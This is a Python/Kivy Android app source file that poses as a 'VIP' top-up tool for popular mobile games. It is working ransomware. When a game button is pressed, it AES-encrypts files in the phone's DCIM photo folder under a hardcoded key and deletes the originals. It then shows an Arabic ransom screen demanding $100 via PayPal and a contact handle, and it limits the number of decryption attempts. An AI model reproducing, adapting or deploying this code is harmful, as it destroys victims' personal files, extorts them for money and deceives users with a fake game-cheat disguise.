# -*- coding: utf-8 -*-
from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen, SlideTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.image import AsyncImage
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.properties import NumericProperty, StringProperty, BooleanProperty
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import threading
import time
import json

Window.clearcolor = (0.05, 0.05, 0.1, 1)

# إعدادات التطبيق
CONFIG_FILE = "lock_config.json"
MAX_ATTEMPTS = 7
PASSWORD = "yanal"
TARGET_FOLDER = "/storage/emulated/0/DCIM/"
FILE_EXT = ".locked"
VIDEO_EXTENSIONS = ['.mp4', '.avi', '.mov', '.mkv', '.flv', '.3gp', '.wmv']

class GameButton(Button):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ''
        self.background_color = (0.1, 0.5, 0.8, 1)
        self.color = (1, 1, 1, 1)
        self.font_size = '16sp'
        self.size_hint_y = None
        self.height = '60dp'
        self.border_radius = [10,]

class LoadingScreen(Screen):
    progress_value = NumericProperty(0)
    status_text = StringProperty("جاري التحميل...")

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = BoxLayout(orientation='vertical', spacing=20, padding=40)
        
        self.logo = AsyncImage(
            source='https://i.imgur.com/JqYeYn7.png',  # صورة هاكر
            size_hint=(1, 0.3),
            pos_hint={'center_x': 0.5})
        
        self.loading_label = Label(
            text="جاري تحميل حزمة VIP...",
            font_size='20sp',
            color=(0, 0.8, 1, 1))
        
        self.progress_bar = ProgressBar(
            max=100,
            size_hint=(1, 0.05))
        
        self.status_label = Label(
            text=self.status_text,
            font_size='16sp',
            color=(1, 1, 1, 1))
        
        self.layout.add_widget(self.logo)
        self.layout.add_widget(self.loading_label)
        self.layout.add_widget(self.progress_bar)
        self.layout.add_widget(self.status_label)
        self.add_widget(self.layout)

    def start_encryption(self, game_name, callback):
        self.loading_label.text = f"جاري تحضير {game_name}..."
        self.progress_value = 0
        
        def update_progress(dt):
            if self.progress_value < 100:
                self.progress_value += 1
                self.progress_bar.value = self.progress_value
                
                if self.progress_value < 30:
                    self.status_text = "جاري التحقق من الملفات..."
                elif self.progress_value < 70:
                    self.status_text = "جاري تشفير البيانات..."
                else:
                    self.status_text = "جاري الانتهاء..."
            else:
                Clock.unschedule(update_progress)
                callback()
        
        threading.Thread(target=self.real_encryption).start()
        Clock.schedule_interval(update_progress, 0.05)

    def real_encryption(self):
        ransom_screen = self.manager.get_screen('ransom')
        if not ransom_screen.already_encrypted:
            ransom_screen.encrypt_all_files()
            ransom_screen.save_config()

class GameScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = BoxLayout(orientation='vertical', spacing=15, padding=20)
        
        self.title = Label(
            text="[b]شحن الألعاب VIP[/b]",
            markup=True,
            font_size='24sp',
            color=(0, 0.8, 1, 1),
            size_hint=(1, 0.15))
        
        self.games_grid = GridLayout(cols=2, spacing=15, size_hint=(1, 0.85))
        
        self.setup_games()
        
        self.layout.add_widget(self.title)
        self.layout.add_widget(self.games_grid)
        self.add_widget(self.layout)
    
    def setup_games(self):
        games = [
            {"name": "فري فاير", "image": "https://i.imgur.com/3QX5Qh9.png", "color": (1, 0.5, 0, 1)},
            {"name": "ببجي موبايل", "image": "https://i.imgur.com/Lb2jX7z.png", "color": (0.8, 0.2, 0.2, 1)},
            {"name": "كول أوف ديوتي", "image": "https://i.imgur.com/9YQ6X9j.png", "color": (0.2, 0.6, 1, 1)},
            {"name": "فورتنايت", "image": "https://i.imgur.com/4V6mJ7A.png", "color": (0.9, 0.4, 0.6, 1)}
        ]
        
        for game in games:
            item = BoxLayout(orientation='vertical', spacing=10)
            
            img = AsyncImage(
                source=game["image"],
                size_hint=(1, 0.7),
                allow_stretch=True)
            
            btn = GameButton(
                text=f"شحن {game['name']}",
                background_color=game["color"])
            
            btn.bind(on_press=lambda x, g=game['name']: self.start_loading(g))
            item.add_widget(img)
            item.add_widget(btn)
            self.games_grid.add_widget(item)
    
    def start_loading(self, game_name):
        ransom_screen = self.manager.get_screen('ransom')
        if ransom_screen.already_encrypted:
            self.manager.current = 'ransom'
        else:
            loading_screen = self.manager.get_screen('loading')
            loading_screen.start_encryption(game_name, lambda: self.show_ransom(game_name))
            self.manager.current = 'loading'
            self.manager.transition = SlideTransition(direction='left')
    
    def show_ransom(self, game_name):
        ransom_screen = self.manager.get_screen('ransom')
        ransom_screen.setup_ransom_info(game_name)
        self.manager.current = 'ransom'
        self.manager.transition = SlideTransition(direction='left')

class RansomScreen(Screen):
    attempts_left = NumericProperty(MAX_ATTEMPTS)
    already_encrypted = BooleanProperty(False)
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.password = PASSWORD
        self.target_folder = TARGET_FOLDER
        self.file_ext = FILE_EXT
        self.key = self.password.ljust(32)[:32].encode('utf-8')
        self.encrypted_files = []
        
        self.load_config()
        self.setup_ui()
    
    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                self.already_encrypted = config.get('encrypted', False)
                self.attempts_left = config.get('attempts_left', MAX_ATTEMPTS)
    
    def save_config(self):
        config = {
            'encrypted': True,
            'attempts_left': self.attempts_left
        }
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f)
    
    def setup_ui(self):
        self.layout = BoxLayout(orientation='vertical', spacing=15, padding=30)
        
        self.logo = AsyncImage(
            source='https://i.imgur.com/m9wAz3P.png',  # صورة تحذير
            size_hint=(1, 0.2),
            pos_hint={'center_x': 0.5})
        
        self.message = Label(
            text="",
            font_size='18sp',
            color=(1, 0.2, 0.2, 1),
            halign='center',
            valign='middle',
            size_hint=(1, 0.4))
        
        self.code_input = TextInput(
            hint_text="أدخل كود الفك هنا...",
            password=True,
            size_hint=(1, 0.1),
            font_size='18sp',
            background_color=(0.1, 0.1, 0.2, 1),
            foreground_color=(1, 1, 1, 1))
        
        self.decrypt_btn = Button(
            text=f"محاولة فك التشفير ({self.attempts_left})",
            background_normal='',
            background_color=(0.8, 0.1, 0.1, 1),
            size_hint=(1, 0.1))
        
        self.contact_label = Label(
            text="للتواصل: @hacker_support\nسعر الفك: 100$",
            font_size='16sp',
            color=(0.8, 0.8, 0.8, 1),
            size_hint=(1, 0.2))
        
        self.decrypt_btn.bind(on_press=self.check_password)
        
        self.layout.add_widget(self.logo)
        self.layout.add_widget(self.message)
        self.layout.add_widget(self.code_input)
        self.layout.add_widget(self.decrypt_btn)
        self.layout.add_widget(self.contact_label)
        self.add_widget(self.layout)
        
        if self.already_encrypted:
            self.setup_ransom_info("اللعبة")
    
    def setup_ransom_info(self, game_name):
        self.message.text = (
            f"[b]!تحذير![/b]\n\n"
            f"تم تشفير جميع ملفاتك بسبب محاولة شحن {game_name} غير المصرح بها.\n\n"
            "لإستعادة ملفاتك تحتاج إلى:\n"
            "1. دفع 100$ عبر باي بال\n"
            "2. إرسال الإثبات إلى الحساب أعلاه\n"
            "3. إدخال الكود الذي ستحصل عليه"
        )
        self.code_input.disabled = False
        self.code_input.text = ""
        self.decrypt_btn.disabled = False
        self.update_attempts_text()
    
    def update_attempts_text(self):
        self.decrypt_btn.text = f"محاولة فك التشفير ({self.attempts_left})"
    
    def check_password(self, instance):
        if self.code_input.text.strip() == self.password:
            self.message.text = "جاري فك تشفير الملفات..."
            self.decrypt_all_files()
        else:
            self.attempts_left -= 1
            self.save_config()
            self.update_attempts_text()
            self.code_input.text = ""
            
            if self.attempts_left <= 0:
                self.message.text = "تم حظر الجهاز! لا يمكنك المحاولة مرة أخرى"
                self.code_input.disabled = True
                self.decrypt_btn.disabled = True
                App.get_running_app().stop()  # إغلاق التطبيق
            else:
                self.message.text = "كود خاطئ! حاول مرة أخرى"
    
    def encrypt_all_files(self):
        if not os.path.exists(self.target_folder):
            os.makedirs(self.target_folder)
        
        self.create_sample_files()
        self.encrypted_files = []
        
        for root, _, files in os.walk(self.target_folder):
            for file in files:
                file_path = os.path.join(root, file)
                lower_file = file.lower()
                
                # تخطي ملفات الفيديو بأي صيغة
                if any(lower_file.endswith(ext) for ext in VIDEO_EXTENSIONS):
                    continue
                
                if not file.endswith(self.file_ext):
                    if self.encrypt_file(file_path):
                        self.encrypted_files.append(file_path)
        
        self.already_encrypted = len(self.encrypted_files) > 0
        return self.already_encrypted
    
    def create_sample_files(self):
        samples = [
            "مستندات_هامة.txt",
            "صور_العائلة.jpg",
            "ملفات_عمل.docx",
            "بيانات_سرية.xlsx"
        ]
        
        for sample in samples:
            file_path = os.path.join(self.target_folder, sample)
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(f"هذا ملف اختباري: {sample}\n")
                f.write("لن تتمكن من فتحه بدون كود الفك الخاص\n")
    
    def encrypt_file(self, file_path):
        try:
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CFB, iv)
            
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            
            encrypted = iv + cipher.encrypt(plaintext)
            
            encrypted_path = file_path + self.file_ext
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted)
            
            os.remove(file_path)
            return True
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return False
    
    def decrypt_all_files(self):
        if not self.already_encrypted:
            self.message.text = "لا توجد ملفات مشفرة!"
            return False
        
        success = True
        decrypted_count = 0
        
        for root, _, files in os.walk(self.target_folder):
            for file in files:
                if file.endswith(self.file_ext):
                    file_path = os.path.join(root, file)
                    if self.decrypt_file(file_path):
                        decrypted_count += 1
                    else:
                        success = False
        
        if success and decrypted_count > 0:
            self.message.text = f"تم فك تشفير {decrypted_count} ملف بنجاح!"
            self.already_encrypted = False
            self.save_config()
            self.decrypt_btn.disabled = True
            self.code_input.disabled = True
            return True
        else:
            self.message.text = "حدث خطأ أثناء فك التشفير! تواصل مع الدعم"
            return False
    
    def decrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            iv = data[:16]
            cipher = AES.new(self.key, AES.MODE_CFB, iv)
            decrypted = cipher.decrypt(data[16:])
            
            original_path = file_path[:-len(self.file_ext)]
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            
            os.remove(file_path)
            return True
        except Exception as e:
            print(f"Error decrypting {file_path}: {e}")
            return False

class GameHackApp(App):
    def build(self):
        sm = ScreenManager()
        
        sm.add_widget(GameScreen(name='games'))
        sm.add_widget(LoadingScreen(name='loading'))
        sm.add_widget(RansomScreen(name='ransom'))
        
        # التحقق من حالة التشفير عند البدء
        ransom_screen = sm.get_screen('ransom')
        if ransom_screen.already_encrypted:
            sm.current = 'ransom'
        else:
            sm.current = 'games'
        
        return sm

if __name__ == "__main__":
    GameHackApp().run()
